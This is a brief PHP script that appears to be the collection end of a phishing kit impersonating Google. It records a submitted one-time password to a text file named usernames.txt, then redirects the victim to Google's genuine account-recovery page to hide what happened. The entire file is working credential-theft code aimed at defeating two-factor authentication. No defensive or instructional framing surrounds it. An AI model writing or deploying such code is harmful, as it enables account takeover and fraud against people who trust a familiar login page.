<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['OTP'] . "\n", FILE_APPEND);
$url = "https://accounts.google.com/signin/v2/recoveryidentifier"; # https://accounts.google.com
header("Location: $url");
exit();
?>
